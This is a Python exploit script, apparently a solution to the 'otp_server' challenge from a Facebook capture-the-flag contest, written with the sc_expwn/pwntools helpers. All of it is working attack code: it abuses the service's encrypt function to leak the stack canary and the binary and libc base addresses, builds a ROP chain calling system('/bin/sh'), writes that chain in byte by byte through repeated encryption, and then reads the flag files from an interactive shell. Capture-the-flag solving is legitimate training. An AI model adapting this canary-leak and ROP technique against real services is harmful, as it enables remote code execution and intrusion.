#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './otp_server'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenges3.fbctf.com', 'port':1338})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
offset_hoge         = 0xdd0

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    otp = OTP(conn)

    otp.set_key('a'*0x1c)
    leak = otp.encrypt('A'*0x100).split('a\x00')[1]
    canary = u64(leak[:8])
    info('canary            = 0x{:08x}'.format(canary))

    addr_hoge = u64(leak[0x8:0x8+8])
    binf.address = addr_hoge - offset_hoge
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

    addr_libc_main = u64(leak[0x10:0x10+8]) - 0xe7
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    rop = ROP(binf)
    rop.call(rop.ret)
    rop.call(addr_libc_system, [addr_libc_str_sh])
    exploit = str(rop)

    for i in range(len(exploit), 0, -1):
        otp.set_key('b'*(i+0x10)+'\x00')
        target = exploit[i-1]
        while otp.encrypt('B')[-1] != target:
            pass
        success('write "{:02x} (ramein {} bytes)"'.format(ord(target), i-1))

    conn.sendlineafter('>>> ', '3')

class OTP:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def set_key(self, key):
        self.sendlineafter('>>> ', '1')
        self.sendafter('key:\n', key)

    def encrypt(self, msg):
        self.sendlineafter('>>> ', '2')
        self.sendafter('encrypt:\n', msg)

        self.recvuntil(' -----\n')
        return self.recvuntil('\n----- ', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    comn.connection.sendline('cat /home/*/flag')
    comn.connection.interactive()
    
#==========
